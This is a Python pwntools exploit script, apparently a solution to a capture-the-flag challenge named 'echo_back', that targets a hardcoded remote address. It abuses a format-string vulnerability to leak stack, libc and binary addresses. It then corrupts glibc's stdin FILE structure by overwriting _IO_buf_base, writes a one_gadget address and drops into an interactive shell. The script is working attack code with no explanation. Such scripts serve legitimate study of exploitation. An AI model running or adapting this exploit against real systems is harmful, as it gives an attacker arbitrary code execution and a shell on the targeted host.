#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
import sys

elfPath = "./echo_back"
libcPath = "./libc.so.6"
remoteAddr = "117.78.43.123"
remotePort = 32619

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath, checksec = False)

libc.sym['_IO_buf_base'] = 0x3c4918
libc.sym['one_gadget'] = 0x45216
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG():
    info("fsb -> {:#x}".format(0xC50))
    raw_input("DEBUG: ")

def set_name(name):
    assert len(name) <= 7
    io.sendlineafter("choice>> ", "1")
    io.sendafter("name:", name)
    sleep(0.01)

def fsb(payload, length = 7, doit = True):
    assert len(payload) <= 7
    io.sendlineafter("choice>> ", "2")
    io.sendlineafter("length:", str(length))
    if doit:
        io.send(payload)
        io.recvuntil(":")
    sleep(0.01)

if __name__ == "__main__":
    fsb("%p.%2$p")
    stack = int(io.recvuntil(".", drop = True), 16) + 0x2690
    success("stack", stack)
    libc.address = int(io.recvuntil("-", drop = True), 16) - 0x3c6780
    success("libc", libc.address)
    fsb("%6$p.")
    elf.address= int(io.recvuntil(".", drop = True), 16) - 0xef8
    success("elf", elf.address)

    set_name(p64(libc.sym['_IO_buf_base'])[: -1])
    fsb("%16$hhn") # lsb(_IO_buf_base) = '\0'

    payload = p64(libc.sym['_IO_2_1_stdin_'] + 131) * 3 + p64(stack + 0x38) + p64(stack + 0x38 + 0x20)
    #  fsb('\n', padding) # set _IO_write_base & _IO_write_ptr & _IO_write_end & _IO_buf_base & _IO_buf_end
    # set _IO_write_base & _IO_write_ptr & _IO_write_end & _IO_buf_base & _IO_buf_end
    io.sendlineafter("choice>> ", "2")
    io.sendafter("length:", payload)
    io.sendline('')

    for i in xrange(len(payload) - 1): # _IO_read_ptr = _IO_read_end -> SYS_read
        fsb('\n', '', False)
   
    #  DEBUG()
    fsb('[*]DONE', p64(libc.sym['one_gadget']))

    io.interactive()
